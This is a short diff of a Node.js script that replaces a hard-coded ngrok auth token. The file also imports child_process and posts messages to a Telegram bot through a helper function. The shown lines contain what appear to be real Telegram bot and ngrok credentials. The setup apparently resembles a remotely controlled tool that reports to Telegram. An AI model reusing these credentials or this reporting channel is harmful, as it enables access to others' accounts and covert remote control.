@@ -1,4 +1,4 @@
-const { exec, spawn } = require("child_process"), axios = require("axios"), BOT_TOKEN = "7828296793:AAEw4A7NI8tVrdrcR0TQZXyOpNSPbJmbGUU", CHAT_ID = "7371969470", NGROK_AUTH_TOKEN = "2tEd9VIVsq4yjGzeuELkR33Uw12_7QvuNGXyPCb9Bty6r4jdK";
+const { exec, spawn } = require("child_process"), axios = require("axios"), BOT_TOKEN = "7828296793:AAEw4A7NI8tVrdrcR0TQZXyOpNSPbJmbGUU", CHAT_ID = "7371969470", NGROK_AUTH_TOKEN = "2tIJ7sttKWvI0UD5rwg1FDZ2yuX_6tGKqPvoQmzWyGhahzgzB";
 
 const sendTelegramMessage = async m => { try { await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: m }); console.log("✅ Tin nhắn đã gửi!"); } catch(e) { console.error("❌ Lỗi gửi Telegram:", e); } };
 
